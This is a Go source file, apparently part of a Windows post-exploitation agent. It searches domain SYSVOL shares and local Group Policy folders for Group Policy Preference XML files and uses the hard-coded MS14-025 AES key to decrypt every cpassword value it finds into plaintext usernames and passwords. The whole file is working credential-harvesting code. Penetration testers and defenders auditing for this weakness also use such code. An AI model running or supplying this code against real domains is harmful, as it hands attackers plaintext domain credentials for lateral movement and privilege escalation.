//go:build windows

package agent

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// MS14-025 static AES-256 key Microsoft published for GPP encryption.
var gppAESKey = []byte{
	0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
	0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
	0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
	0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
}

// GPPCred holds one decrypted Group Policy Preference credential.
type GPPCred struct {
	Source   string `json:"source"`
	Target   string `json:"target"`
	Username string `json:"username"`
	Password string `json:"password"`
}

var gppFileNames = []string{
	"Groups.xml",
	"Services.xml",
	"ScheduledTasks.xml",
	"DataSources.xml",
	"Printers.xml",
}

// gppDecrypt decrypts a GPP cpassword value.
// cpassword is AES-256-CBC with a zero IV and static key, then Base64-encoded.
// The plaintext is UTF-16LE.
func gppDecrypt(cpassword string) (string, error) {
	// Pad Base64 to multiple of 4
	switch len(cpassword) % 4 {
	case 2:
		cpassword += "=="
	case 3:
		cpassword += "="
	}
	enc, err := base64.StdEncoding.DecodeString(cpassword)
	if err != nil {
		return "", err
	}
	block, err := aes.NewCipher(gppAESKey)
	if err != nil {
		return "", err
	}
	if len(enc) == 0 || len(enc)%aes.BlockSize != 0 {
		return "", fmt.Errorf("invalid ciphertext length %d", len(enc))
	}
	iv := make([]byte, aes.BlockSize)
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(enc, enc)

	// Strip PKCS7 padding
	if pad := int(enc[len(enc)-1]); pad > 0 && pad <= aes.BlockSize {
		enc = enc[:len(enc)-pad]
	}

	// Convert UTF-16LE to string
	return utf16leToString(enc), nil
}

func utf16leToString(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	runes := make([]rune, 0, len(b)/2)
	for i := 0; i+1 < len(b); i += 2 {
		r := rune(b[i]) | rune(b[i+1])<<8
		if r == 0 {
			break
		}
		runes = append(runes, r)
	}
	return string(runes)
}

// parseGPPFile scans an XML file for any element with a cpassword attribute.
func parseGPPFile(path string) ([]GPPCred, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	dec := xml.NewDecoder(bytes.NewReader(data))
	var creds []GPPCred
	for {
		tok, err := dec.Token()
		if err != nil {
			break
		}
		se, ok := tok.(xml.StartElement)
		if !ok {
			continue
		}
		var cpass, user string
		for _, a := range se.Attr {
			switch strings.ToLower(a.Name.Local) {
			case "cpassword":
				cpass = a.Value
			case "username", "accountname", "runasusername", "newname":
				if user == "" {
					user = a.Value
				}
			}
		}
		if cpass == "" {
			continue
		}
		pw, err := gppDecrypt(cpass)
		if err != nil {
			pw = fmt.Sprintf("[decrypt error: %v]", err)
		}
		creds = append(creds, GPPCred{
			Source:   "GPP:" + filepath.Base(path),
			Target:   path,
			Username: user,
			Password: pw,
		})
	}
	return creds, nil
}

// gppSearchDir walks dir recursively looking for GPP XML files.
func gppSearchDir(dir string, results *[]GPPCred) {
	_ = filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		name := d.Name()
		for _, gf := range gppFileNames {
			if strings.EqualFold(name, gf) {
				creds, _ := parseGPPFile(path)
				*results = append(*results, creds...)
				break
			}
		}
		return nil
	})
}

// huntGPPPasswords finds and decrypts GPP cpassword values from SYSVOL and local policy.
func huntGPPPasswords() ([]GPPCred, error) {
	var results []GPPCred

	// 1. SYSVOL via UNC (domain member)
	domain := os.Getenv("USERDNSDOMAIN")
	logonSrv := os.Getenv("LOGONSERVER") // e.g. \\DC01
	if domain != "" {
		sysvolUNC := `\\` + strings.TrimPrefix(logonSrv, `\\`) + `\SYSVOL\` + domain + `\Policies`
		if logonSrv == "" {
			sysvolUNC = `\\` + domain + `\SYSVOL\` + domain + `\Policies`
		}
		gppSearchDir(sysvolUNC, &results)
	}

	// 2. Local SYSVOL (if this is a DC)
	for _, localPath := range []string{
		`C:\Windows\SYSVOL\sysvol`,
		`C:\Windows\SYSVOL`,
		`C:\Windows\System32\GroupPolicy`,
	} {
		if _, err := os.Stat(localPath); err == nil {
			gppSearchDir(localPath, &results)
		}
	}

	if len(results) == 0 {
		return nil, fmt.Errorf("no GPP cpassword entries found (SYSVOL: %s)", domain)
	}
	// Deduplicate by username+password
	seen := map[string]bool{}
	deduped := results[:0]
	for _, c := range results {
		key := c.Username + "|" + c.Password
		if !seen[key] {
			seen[key] = true
			deduped = append(deduped, c)
		}
	}
	return deduped, nil
}
